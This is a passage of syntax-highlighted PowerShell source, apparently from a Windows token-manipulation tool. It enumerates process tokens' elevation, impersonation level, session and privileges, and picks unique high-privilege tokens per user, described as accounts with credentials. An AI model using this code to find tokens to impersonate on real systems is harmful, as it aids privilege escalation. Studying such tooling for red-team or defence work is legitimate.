                        <span class="token variable">$TokenElevation</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenelevationPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_ELEVATION</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TokenElevation</span><span class="token punctuation">.</span>TokenIsElevated <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>IsElevated = <span class="token boolean">$true</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenElevationPtr</span><span class="token punctuation">)</span>


                    <span class="token comment" spellcheck="true">#Query the token type to determine if the token is a primary or impersonation token</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name TokenType <span class="token operator">-</span>Value <span class="token string">"UnableToRetrieve"</span>

                    <span class="token namespace">[UInt32]</span><span class="token variable">$TokenTypeSize</span> = 4
                    <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenTypePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenTypeSize</span><span class="token punctuation">)</span>
                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0
                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenType<span class="token punctuation">,</span> <span class="token variable">$TokenTypePtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenTypeSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenType</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenTypePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
                        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$TokenType</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            1 <span class="token punctuation">{</span><span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>TokenType = <span class="token string">"Primary"</span><span class="token punctuation">}</span>
                            2 <span class="token punctuation">{</span><span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>TokenType = <span class="token string">"Impersonation"</span><span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenTypePtr</span><span class="token punctuation">)</span>


                    <span class="token comment" spellcheck="true">#Query the impersonation level if the token is an Impersonation token</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>TokenType <span class="token operator">-</span>ieq <span class="token string">"Impersonation"</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name ImpersonationLevel <span class="token operator">-</span>Value <span class="token string">"UnableToRetrieve"</span>

                        <span class="token namespace">[UInt32]</span><span class="token variable">$ImpersonationLevelSize</span> = 4
                        <span class="token namespace">[IntPtr]</span><span class="token variable">$ImpersonationLevelPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$ImpersonationLevelSize</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#sizeof uint32</span>
                        <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0
                        <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenImpersonationLevel<span class="token punctuation">,</span> <span class="token variable">$ImpersonationLevelPtr</span><span class="token punctuation">,</span> <span class="token variable">$ImpersonationLevelSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                            <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
                        <span class="token punctuation">}</span>
                        <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                            <span class="token namespace">[UInt32]</span><span class="token variable">$ImpersonationLevel</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ImpersonationLevelPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
                            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$ImpersonationLevel</span><span class="token punctuation">)</span>
                            <span class="token punctuation">{</span>
                                0 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityAnonymous"</span> <span class="token punctuation">}</span>
                                1 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityIdentification"</span> <span class="token punctuation">}</span>
                                2 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityImpersonation"</span> <span class="token punctuation">}</span>
                                3 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityDelegation"</span> <span class="token punctuation">}</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>
                        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$ImpersonationLevelPtr</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>


                    <span class="token comment" spellcheck="true">#Query the token sessionid</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name SessionID <span class="token operator">-</span>Value <span class="token string">"Unknown"</span>

                    <span class="token namespace">[UInt32]</span><span class="token variable">$TokenSessionIdSize</span> = 4
                    <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenSessionIdPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenSessionIdSize</span><span class="token punctuation">)</span>
                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0
                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenSessionId<span class="token punctuation">,</span> <span class="token variable">$TokenSessionIdPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenSessionIdSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve Token SessionId. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenSessionId</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenSessionIdPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>
                        <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>SessionID = <span class="token variable">$TokenSessionId</span>
                    <span class="token punctuation">}</span>
                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenSessionIdPtr</span><span class="token punctuation">)</span>


                    <span class="token comment" spellcheck="true">#Query the token privileges</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name PrivilegesEnabled <span class="token operator">-</span>Value @<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name PrivilegesAvailable <span class="token operator">-</span>Value @<span class="token punctuation">(</span><span class="token punctuation">)</span>

                    <span class="token namespace">[UInt32]</span><span class="token variable">$TokenPrivilegesSize</span> = 1000
                    <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenPrivilegesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesSize</span><span class="token punctuation">)</span>
                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0
                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenPrivileges<span class="token punctuation">,</span> <span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivilegesSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve Token SessionId. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$TokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>

                        <span class="token comment" spellcheck="true">#Loop through each privilege</span>
                        <span class="token namespace">[IntPtr]</span><span class="token variable">$PrivilegesBasePtr</span> = <span class="token namespace">[IntPtr]</span><span class="token punctuation">(</span>Add<span class="token operator">-</span>SignedIntAsUnsigned <span class="token variable">$TokenPrivilegesPtr</span> <span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::OffsetOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">,</span> <span class="token string">"Privileges"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token variable">$LuidAndAttributeSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>
                        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> = 0<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-lt</span> <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>PrivilegeCount<span class="token punctuation">;</span> <span class="token variable">$i</span>+<span class="token operator">+</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$LuidAndAttributePtr</span> = <span class="token namespace">[IntPtr]</span><span class="token punctuation">(</span>Add<span class="token operator">-</span>SignedIntAsUnsigned <span class="token variable">$PrivilegesBasePtr</span> <span class="token punctuation">(</span><span class="token variable">$LuidAndAttributeSize</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                            <span class="token variable">$LuidAndAttribute</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>

                            <span class="token comment" spellcheck="true">#Lookup privilege name</span>
                            <span class="token namespace">[UInt32]</span><span class="token variable">$PrivilegeNameSize</span> = 60
                            <span class="token variable">$PrivilegeNamePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$PrivilegeNameSize</span><span class="token punctuation">)</span>
                            <span class="token variable">$PLuid</span> = <span class="token variable">$LuidAndAttributePtr</span> <span class="token comment" spellcheck="true">#The Luid structure is the first object in the LuidAndAttributes structure, so a ptr to LuidAndAttributes also points to Luid</span>

                            <span class="token variable">$Success</span> = <span class="token variable">$LookupPrivilegeNameW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$PLuid</span><span class="token punctuation">,</span> <span class="token variable">$PrivilegeNamePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$PrivilegeNameSize</span><span class="token punctuation">)</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
                            <span class="token punctuation">{</span>
                                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token function">Write-Warning</span> <span class="token string">"Call to LookupPrivilegeNameW failed. Error code: <span class="token variable">$ErrorCode</span>. RealSize: <span class="token variable">$PrivilegeNameSize</span>"</span>
                            <span class="token punctuation">}</span>
                            <span class="token variable">$PrivilegeName</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$PrivilegeNamePtr</span><span class="token punctuation">)</span>

                            <span class="token comment" spellcheck="true">#Get the privilege attributes</span>
                            <span class="token variable">$PrivilegeStatus</span> = <span class="token string">""</span>
                            <span class="token variable">$Enabled</span> = <span class="token boolean">$false</span>

                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-eq</span> 0<span class="token punctuation">)</span>
                            <span class="token punctuation">{</span>
                                <span class="token variable">$Enabled</span> = <span class="token boolean">$false</span>
                            <span class="token punctuation">}</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-band</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="token punctuation">)</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#enabled by default</span>
                            <span class="token punctuation">{</span>
                                <span class="token variable">$Enabled</span> = <span class="token boolean">$true</span>
                            <span class="token punctuation">}</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-band</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED<span class="token punctuation">)</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#enabled</span>
                            <span class="token punctuation">{</span>
                                <span class="token variable">$Enabled</span> = <span class="token boolean">$true</span>
                            <span class="token punctuation">}</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-band</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_REMOVED<span class="token punctuation">)</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_REMOVED<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#SE_PRIVILEGE_REMOVED. This should never exist. Write a warning if it is found so I can investigate why/how it was found.</span>
                            <span class="token punctuation">{</span>
                                <span class="token function">Write-Warning</span> <span class="token string">"Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. "</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Enabled</span><span class="token punctuation">)</span>
                            <span class="token punctuation">{</span>
                                <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>PrivilegesEnabled <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$PrivilegeName</span>
                            <span class="token punctuation">}</span>
                            <span class="token keyword">else</span>
                            <span class="token punctuation">{</span>
                                <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>PrivilegesAvailable <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$PrivilegeName</span>
                            <span class="token punctuation">}</span>

                            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$PrivilegeNamePtr</span><span class="token punctuation">)</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">)</span>

                <span class="token punctuation">}</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Verbose</span> <span class="token string">"Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data.<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>UserName<span class="token punctuation">.</span>Length<span class="token punctuation">)</span></span>"</span>
                <span class="token punctuation">}</span>

                <span class="token comment" spellcheck="true">#Free LogonSessionData</span>
                <span class="token variable">$ntstatus</span> = <span class="token variable">$LsaFreeReturnBuffer</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$LogonSessionDataPtr</span><span class="token punctuation">)</span>
                <span class="token variable">$LogonSessionDataPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ntstatus</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Warning</span> <span class="token string">"Call to LsaFreeReturnBuffer failed. Error code: <span class="token variable">$ntstatus</span>"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">)</span>
            <span class="token variable">$LuidPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token punctuation">}</span>

        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenStatsPtr</span><span class="token punctuation">)</span>
        <span class="token variable">$TokenStatsPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero

        <span class="token keyword">return</span> <span class="token variable">$ReturnObj</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Takes an array of TokenObjects built by the script and returns the unique ones</span>
    <span class="token keyword">function</span> Get<span class="token operator">-</span>UniqueTokens
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[Object[]</span><span class="token punctuation">]</span>
            <span class="token variable">$AllTokens</span>
        <span class="token punctuation">)</span>

        <span class="token variable">$TokenByUser</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token variable">$TokenByEnabledPriv</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token variable">$TokenByAvailablePriv</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">#Filter tokens by user</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$Key</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>Domain <span class="token operator">+</span> <span class="token string">"\"</span> <span class="token operator">+</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>Username
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$TokenByUser</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Key</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">#Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because</span>
                <span class="token comment" spellcheck="true">#    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>LogonType <span class="token operator">-ne</span> 3 <span class="token operator">-and</span>
                    <span class="token variable">$Token</span><span class="token punctuation">.</span>Username <span class="token operator">-</span>inotmatch <span class="token string">"^DWM-\d+$"</span> <span class="token operator">-and</span>
                    <span class="token variable">$Token</span><span class="token punctuation">.</span>Username <span class="token operator">-</span>inotmatch <span class="token string">"^LOCAL\sSERVICE$"</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$TokenByUser</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$Key</span><span class="token punctuation">,</span> <span class="token variable">$Token</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">#If Tokens have equal elevation levels, compare their privileges.</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>IsElevated <span class="token operator">-eq</span> <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>IsElevated<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesEnabled<span class="token punctuation">.</span>Count <span class="token operator">+</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesAvailable<span class="token punctuation">.</span>Count<span class="token punctuation">)</span> <span class="token operator">-gt</span> <span class="token punctuation">(</span><span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PrivilegesEnabled<span class="token punctuation">.</span>Count <span class="token operator">+</span> <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PrivilegesAvailable<span class="token punctuation">.</span>Count<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span> = <span class="token variable">$Token</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">#If the new token is elevated and the current token isn't, use the new token</span>
                <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>IsElevated <span class="token operator">-eq</span> <span class="token boolean">$true</span><span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token punctuation">(</span><span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>IsElevated <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span> = <span class="token variable">$Token</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">#Filter tokens by privilege</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$Fullname</span> = <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>Domain<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>Username<span class="token punctuation">)</span></span>"</span>

            <span class="token comment" spellcheck="true">#Filter currently enabled privileges</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Privilege</span> in <span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesEnabled<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">-notcontains</span> <span class="token variable">$Fullname</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$Fullname</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$Fullname</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">#Filter currently available (but not enable) privileges</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Privilege</span> in <span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesAvailable<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
